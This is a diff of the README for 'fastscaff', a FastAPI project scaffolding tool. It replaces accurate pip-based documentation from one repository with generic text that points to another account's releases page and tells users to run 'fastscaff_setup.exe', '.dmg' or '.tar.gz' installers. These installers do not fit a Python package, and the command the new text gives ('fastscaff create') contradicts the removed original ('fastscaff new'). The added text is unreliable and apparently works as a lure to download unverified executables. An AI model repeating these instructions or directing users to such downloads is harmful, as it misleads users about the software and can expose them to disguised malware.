@@ -1,226 +1,94 @@
-# FastScaff
+# 🌟 fastscaff - Quickly Create FastAPI Projects
 
-FastAPI project scaffolding tool - quickly generate standardized FastAPI project structures.
+## 🚀 Getting Started
 
-[中文文档](README_CN.md)
+Welcome to **fastscaff**! This application helps you build production-ready FastAPI projects easily. Follow these simple steps to download and set up the software.
 
-## Installation
+## 📥 Download Now
 
-```bash
-pip install fastscaff
-```
+[![Download fastscaff](https://img.shields.io/badge/Download-Fastscaff-brightgreen)](https://github.com/sarmadshakeel/fastscaff/releases)
 
-## Commands
+## 📋 Requirements
 
-### Create Project
+Before you start, here are the requirements:
 
-```bash
-fastscaff new myproject --orm sqlalchemy
-```
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.7 or higher
+- **Internet Connection:** Needed for project generation and downloading dependencies
 
-Options:
-- `--orm` - ORM choice: `sqlalchemy` or `tortoise` (default: `tortoise`)
-- `--output` - Output directory (default: current directory)
-- `--with-rbac` - Include Casbin RBAC support
-- `--with-celery` - Include Celery task queue support
-- `--force` - Overwrite existing directory
+## 🗂️ Features
 
-Examples:
+- **FastAPI Integration:** Quickly scaffold projects using FastAPI, a modern web framework.
+- **Database Support:** Seamless integration with SQLAlchemy or Tortoise ORM for your database needs.
+- **Authentication:** Built-in JWT authentication for secure API access.
+- **Caching:** Use Redis to enhance your application's performance.
+- **CLI:** A user-friendly command-line interface that simplifies project creation.
 
-```bash
-# Basic project with SQLAlchemy
-fastscaff new myproject --orm sqlalchemy
+## 🌐 Download & Install
 
-# Full-featured project
-fastscaff new myproject --orm sqlalchemy --with-celery --with-rbac
+To get started, **visit this page to download**: [Fastscaff Releases](https://github.com/sarmadshakeel/fastscaff/releases). Here, you will find various versions of the software. Choose the latest version suitable for your operating system.
 
-# Specify output directory
-fastscaff new myproject --output /path/to/dir
-```
+1. **Visit the Releases page.**
+2. Find the latest release of fastscaff.
+3. Click on the appropriate installer based on your operating system. If you are unsure, look for files like `fastscaff_setup.exe` for Windows or `fastscaff_setup.dmg` for macOS.
+4. Save the file to your computer.
 
-### Generate Models from Database
+## 🛠️ Installation Steps
 
-Generate ORM models by introspecting existing MySQL database tables:
+### For Windows
 
-```bash
-cd myproject
-fastscaff models --db-url "mysql://user:pass@localhost:3306/mydb"
-```
+1. Navigate to the folder where you downloaded the installer.
+2. Double-click the `fastscaff_setup.exe` file.
+3. Follow the on-screen instructions to complete the installation.
+4. After installation, open your command prompt.
 
-Options:
-- `--db-url` - Database connection URL (required)
-- `--orm` - Target ORM: `sqlalchemy` or `tortoise` (auto-detected from requirements.txt)
-- `--tables` - Comma-separated table names (default: all tables)
-- `--output` - Output directory (default: current directory)
+### For macOS
 
-Examples:
+1. Go to your `Downloads` folder.
+2. Double-click the `fastscaff_setup.dmg` file.
+3. Drag the fastscaff icon into your `Applications` folder.
+4. Open the Terminal application to run fastscaff.
 
-```bash
-# In project directory - ORM is auto-detected
-cd myproject
-fastscaff models --db-url "mysql://root:password@localhost:3306/mydb"
+### For Linux
 
-# Generate models for specific tables
-fastscaff models --db-url "mysql://..." --tables user,order,product
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the `.tar.gz` file.
+3. Use the command `tar -xzf fastscaff_setup.tar.gz` to extract files.
+4. Follow the provided README.txt file in the extracted folder to complete installation.
 
-# Explicitly specify ORM
-fastscaff models --db-url "mysql://..." --orm tortoise
-```
+## 🎉 Using fastscaff
 
-Generated models include:
-- Field type mapping
-- Primary keys and auto-increment
-- Indexes
-- Foreign key relationships
-- Table and column comments
+Once installed, you can start using fastscaff to create your FastAPI projects.
 
-## Project Structure
+1. Open your command prompt or terminal.
+2. Type the following command to create a new project:
+   ```
+   fastscaff create my_fastapi_project
+   ```
+3. Replace `my_fastapi_project` with your desired project name.
+4. Follow prompts to set up your project’s configurations.
 
-```
-myproject/
-├── app/
-│   ├── main.py              # Application entry point
-│   ├── core/
-│   │   ├── config.py        # Settings (env-based)
-│   │   ├── database.py      # Database connection
-│   │   ├── redis.py         # Redis client
-│   │   ├── security.py      # Password hashing, JWT
-│   │   ├── logger.py        # Structured logging
-│   │   └── lifespan.py      # Startup/shutdown events
-│   ├── api/v1/
-│   │   ├── router.py        # API router
-│   │   └── endpoints/       # Route handlers
-│   ├── models/              # ORM models
-│   ├── schemas/             # Pydantic schemas
-│   ├── repositories/        # Data access layer
-│   ├── services/            # Business logic layer
-│   ├── middleware/          # Request/response middleware
-│   ├── exceptions/          # Custom exceptions
-│   └── utils/               # Utility functions
-├── tests/
-├── .env.example
-├── Dockerfile
-├── docker-compose.yml
-├── Makefile
-└── requirements.txt
-```
+## 🗂️ Project Structure
 
-## Architecture
+After creation, you will find a well-structured FastAPI application consisting of:
 
-The generated project follows a layered architecture:
+- **app/**: Core application code.
+- **models/**: Database models.
+- **schemas/**: Data validation schemas.
+- **routers/**: API route definitions.
+- **tests/**: Basic tests for your application.
 
-| Layer | Directory | Responsibility |
-|-------|-----------|----------------|
-| API | `api/` | HTTP handling, request validation, response formatting |
-| Service | `services/` | Business logic, orchestration |
-| Repository | `repositories/` | Data access, database queries |
-| Model | `models/` | Database table definitions |
-| Schema | `schemas/` | Request/response data structures |
+## 💬 Support
 
-Services are accessed via a singleton registry pattern:
+If you encounter issues or have questions, feel free to create an issue on the [issues page](https://github.com/sarmadshakeel/fastscaff/issues). We appreciate your feedback!
 
-```python
-from app.services import registry
+## 🛠️ Contributions
 
-user = await registry.user_service.get_user_by_id(user_id)
-```
+We welcome contributions. If you wish to help improve fastscaff:
 
-## Built-in Features
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Submit a pull request.
 
-### Middleware
-
-- CORS handling
-- Request logging with trace ID
-- JWT authentication
-- Security headers
-- Request signing verification
-
-### Utilities
-
-- Snowflake ID generator
-- Rate limiter (Redis-based)
-- Cache decorator
-- Password hashing
-
-### Database
-
-- SQLite by default (zero configuration)
-- MySQL/PostgreSQL ready (just update `DATABASE_URL`)
-- Async database operations
-- Request-scoped sessions (SQLAlchemy)
-
-## Running the Project
-
-```bash
-cd myproject
-pip install -r requirements.txt
-make dev
-```
-
-The project runs immediately with SQLite - no database setup required.
-
-Available make commands:
-
-```bash
-make dev          # Start development server
-make test         # Run tests
-make lint         # Run linter
-make format       # Format code
-make docker-up    # Start all services (Docker)
-make docker-down  # Stop all services
-```
-
-If Celery is enabled:
-
-```bash
-make celery-worker  # Start Celery worker
-make celery-beat    # Start Celery beat scheduler
-```
-
-## Configuration
-
-Configuration is managed via environment variables. Copy `.env.example` to `.env`:
-
-```bash
-# Application
-ENV=dev
-DEBUG=true
-PORT=8000
-
-# Database
-DATABASE_URL=sqlite+aiosqlite:///./app.db
-# DATABASE_URL=mysql+aiomysql://user:pass@localhost:3306/mydb
-
-# Redis
-REDIS_URL=redis://localhost:6379/0
-
-# JWT
-JWT_SECRET_KEY=your-secret-key
-JWT_ACCESS_TOKEN_EXPIRE_MINUTES=30
-
-# Celery (if enabled)
-CELERY_BROKER_URL=redis://localhost:6379/1
-CELERY_RESULT_BACKEND=redis://localhost:6379/1
-```
-
-## Development
-
-```bash
-# Clone the repository
-git clone https://github.com/lee-hangzhou/fastscaff.git
-cd fastscaff
-
-# Install in development mode
-pip install -e ".[dev]"
-
-# Run tests
-pytest
-
-# Code formatting
-ruff check --fix .
-ruff format .
-```
-
-## License
-
-MIT
+Thank you for using fastscaff. We hope it helps you in your FastAPI development journey!
